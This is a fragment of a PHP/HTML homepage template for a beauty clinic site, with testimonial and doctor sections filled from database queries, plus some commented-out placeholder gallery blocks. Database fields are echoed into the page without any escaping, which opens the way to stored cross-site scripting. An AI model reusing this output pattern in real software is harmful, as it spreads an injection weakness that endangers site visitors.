                               <a href="https://www.youtube.com/embed/H6zpANP3QyU" data-vbtype="video" data-autoplay="true" class="venobox vbox-item">
                                  <img src="images/services/Laser_Beard.jpg" alt="images/offers/1.jpg" class="img-fluid">
                              </a>
                            </div>
                       
                        </div>
                        <div class="blog-content">
                            <a href="#" class="title fw-500 pt-20">Permanent Laser Beard Shaping</a>
                            <a href="#" class="readmore" title="Read More for Details" target="-blank">Read More <i class="fa fa-angle-right"></i></a>
                        </div>
                    </div>
                </div>-->
                <!--/col-->
            </div>


            <div class="d-flex justify-content-end mt-3">
<a href="ourvedios.php" class="btn-danger fw-700 p-2" title="Read More for Details" target="-blank" style="float:right">Read More <i class="fa fa-angle-right"></i></a>
</div>
            <!--/row-->
        </div>
    </section>
    <!-- ======================================= 
            ==End blog section== 
    =======================================-->
    



    <!-- ======================================= 
            ==Start beauty lab gallery section==  
    =======================================-->
  <!--  <section class="beautyLab-gallery">
        <div class="overlay"></div>
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="section-title text-center">
                        <h3 class="color-ff fw-500 pb-10">Our Beauty Lab</h3>
                        <p class="color-ff">Lorem ipsum dolor sit amet, consectetur adipisici elit, sed eiusmod tempor incidunt ut labore etc</p>
                    </div>
                </div>
            </div>
            

            <ul class="filtering-menu">
                <li class="is-checked" data-filter="*">All</li>
                <li data-filter=".treatment">Beauty Treatment</li>
                <li data-filter=".interiors">Beauty Interiors</li>
            </ul>

            <div class="row gallery-wrapper">

              
                <div class="col-lg-4 col-md-6  mix interiors">
                    <div class="single-gallery">
                        <img src="images/beauty-galleryImg1.jpg" alt="gallery image" class="img-fluid" />
                        <div class="single-gallery-overlay text-center">
                            <h6><a href="#" class="color-ff fw-500">Beauty Treatment</a></h6>
                            <div class="divider mt-15 mb-10"></div>
                            <p class="color-ff">Most designers set their type arbitrarily, either by pulling values</p>
                        </div>
                    </div>
                </div>

                
                <div class="col-lg-4 col-md-6  mix treatment">
                    <div class="single-gallery">
                        <img src="images/beauty-galleryImg2.jpg" alt="gallery image" class="img-fluid" />
                        <div class="single-gallery-overlay text-center">
                            <h6><a href="#" class="color-ff fw-500">Beauty Treatment</a></h6>
                            <div class="divider mt-15 mb-10"></div>
                            <p class="color-ff">Most designers set their type arbitrarily, either by pulling values</p>
                        </div>
                    </div>
                </div>

               
                <div class="col-lg-4 col-md-6  mix interiors">
                    <div class="single-gallery">
                        <img src="images/beauty-galleryImg3.jpg" alt="gallery image" class="img-fluid" />
                        <div class="single-gallery-overlay text-center">
                            <h6><a href="#" class="color-ff fw-500">Beauty Treatment</a></h6>
                            <div class="divider mt-15 mb-10"></div>
                            <p class="color-ff">Most designers set their type arbitrarily, either by pulling values</p>
                        </div>
                    </div>
                </div>

               
                <div class="col-lg-4 col-md-6  mix treatment">
                    <div class="single-gallery">
                        <img src="images/beauty-galleryImg4.jpg" alt="gallery image" class="img-fluid" />
                        <div class="single-gallery-overlay text-center">
                            <h6><a href="#" class="color-ff fw-500">Beauty Treatment</a></h6>
                            <div class="divider mt-15 mb-10"></div>
                            <p class="color-ff">Most designers set their type arbitrarily, either by pulling values</p>
                        </div>
                    </div>
                </div>

               
                <div class="col-lg-4 col-md-6  mix interiors">
                    <div class="single-gallery">
                        <img src="images/beauty-galleryImg5.jpg" alt="gallery image" class="img-fluid" />
                        <div class="single-gallery-overlay text-center">
                            <h6><a href="#" class="color-ff fw-500">Beauty Treatment</a></h6>
                            <div class="divider mt-15 mb-10"></div>
                            <p class="color-ff">Most designers set their type arbitrarily, either by pulling values</p>
                        </div>
                    </div>
                </div>

              
                <div class="col-lg-4 col-md-6  mix treatment">
                    <div class="single-gallery">
                        <img src="images/beauty-galleryImg6.jpg" alt="gallery image" class="img-fluid" />
                        <div class="single-gallery-overlay text-center">
                            <h6><a href="#" class="color-ff fw-500">Beauty Treatment</a></h6>
                            <div class="divider mt-15 mb-10"></div>
                            <p class="color-ff">Most designers set their type arbitrarily, either by pulling values</p>
                        </div>
                    </div>
                </div>
              
            </div>
            
        </div>
    </section>-->
    <!-- ======================================= 
            ==End beauty lab gellary section== 
    =======================================-->



    <!-- ======================================= 
            ==Start Testimonial section==  
    =======================================-->
    <section class="testimonial-section "style="margin-top:80px">
        <div class="overlay"></div>
        <div class="container">
            <div class="row">
                <div class="col-xl-6 offset-xl-3 col-lg-8 offset-lg-2 col-md-8 offset-md-2">
                    <div class="section-title pb-60 text-center">
                        <h3 class="color-ff fw-500">Testimonials</h3>
                    </div>

                    <div class="testimoial-wrapper owl-carousel">
                        <!--testimonial-1-->
                        
                        
                        
                        
                        
                        <?php 
$tstmnl_lst="select * from testimonials";
$qst_tstmnl_lst=$db->query($tstmnl_lst);
$sno=1;
while($clct_tstmnl=$qst_tstmnl_lst->fetch_assoc())
{
$vd_link=$clct_tstmnl['content'];

$vdo_sid=$clct_tstmnl['id'];
$vdos_img=$clct_tstmnl['image'];
$vdos_tttl=$clct_tstmnl['name'];

?>
                        
                        <div class="single-testimonial text-center">
                            <a href="#"><img src="admin/testimonial_image/<?php echo $vdos_img;?>" alt="author"></a>
                            <p class="testimoinal-txt color-ff pt-25"><?php echo $vd_link?></p>
                            <p class="author color-ff"><?php echo $vdos_tttl?><span></span></p>
                        </div>
                        <?php 
}
                        ?>

                        <!--testimonial-2-->
                      <!--  <div class="single-testimonial text-center">
                            <a href="#"><img src="images/author1.jpg" alt="author"></a>
                            <p class="testimoinal-txt color-ff pt-25">I just wanted to thank you for providing a great celebration party for me. Your staff did an excellent job and the Makeup was superb. Everyone was impressed.Thanks again!</p>
                            <p class="author color-ff">Thomas Jefferson<span>CEO of TF</span></p>
                        </div>-->

                        <!--testimonial-3-->
      <!--                  <div class="single-testimonial text-center">
                            <a href="#"><img src="images/author2.jpg" alt="author"></a>
                            <p class="testimoinal-txt color-ff pt-25">I just wanted to thank you for providing a great celebration party for me. Your staff did an excellent job and the Makeup was superb. Everyone was impressed.Thanks again!</p>
                            <p class="author color-ff">Thomas Jefferson<span>CEO of TF</span></p>
                        </div>-->
                        <!--/testimonial-->
                    </div>
                    <!--/testimoial wrapper-->
                </div>
                <!--/col-->
            </div>
        </div>
    </section>
    <!-- ======================================= 
            ==End Testimonial section== 
    =======================================-->


    <!-- ======================================= 
            ==Start Blog section==  
    =======================================-->
    <section class="blog-section">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="section-title pb-60 text-center">
                        <h3 class="color-72 fw-500 pb-10">Our Doctors</h3>
                        <!--<p>Lorem ipsum dolor sit amet, consectetur adipisici elit, sed eiusmod tempor incidunt ut labore et.</p>-->
                    </div>
                </div>
            </div>
            <!--/row-->

            <div class="row">
                <!--blog 1-->
                <?php 
            $slt_blg="select * from blog limit 3";
            $qst_slt_blg=$db->query($slt_blg);
            
            while($clct_slt_blg=$qst_slt_blg->fetch_assoc())
            {
                $blg_img=$clct_slt_blg['image'];
                $blg_ttl=$clct_slt_blg['title'];
                $blg_cncnct=$clct_slt_blg['content'];
                $blg_id=$clct_slt_blg['id'];
                 $stringCut = substr($blg_cncnct, 0, 100);
            ?>
                
                <div class="col-lg-4">
                    <div class="single-blog">
                        <div class="blog-img pos-relative">
                            <div class="img-area">
                                <a href="#"><img src="admin/blog_image/<?php echo $blg_img;?>" alt="blog img" class="img-fluid" style="height: 270px;"></a>
                            </div>
                       
                        </div>
                        <div class="blog-content">
                            <a href="#" class="title fw-500 pt-20"><?php echo $blg_ttl;?></a>
                            <?php echo $stringCut;?>
                            <a href="doctor-details.php?id=<?php echo $blg_id;?>" class="readmore btn-danger text-white p-2" title="Read More for Details " target="-blank">Read More <i class="fa fa-angle-right"></i></a>
                        </div>
                    </div>
                </div>

            <?php 
            }
            ?>   
                <!--/col-->
            </div>
            <!--/row-->
        </div>
    </section>
    <!-- ======================================= 
            ==End blog section== 
    =======================================-->
    
    
    <!-- ======================================= 
            ==Start google map section==  
    =======================================-->
   <!-- <section class="google-map-section">
        <div id="map" class="mapHome1"></div>
    </section>-->
    <!-- ======================================= 
            ==End google map section== 
    =======================================-->
    
    
    <!-- ======================================= 
            ==Start call to action section==  
    =======================================-->
    <section class="cta-section">
        <div class="overlay"></div>
        <div class="container">
            <div class="row">
                <div class="col-xl-10 offset-xl-1 col-lg-10 offset-lg-1">
                    <div class="cta-content">
                        <p>Book a session and get up to <span class="color-d5">25%</span> discount!</p>
                        <a href="offers.php"class="text-dark" style="background:#fff">Book A Session Now</a>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ======================================= 
            ==End call to action section== 
    =======================================-->
    
    
   <?php include "include/footer.php";?>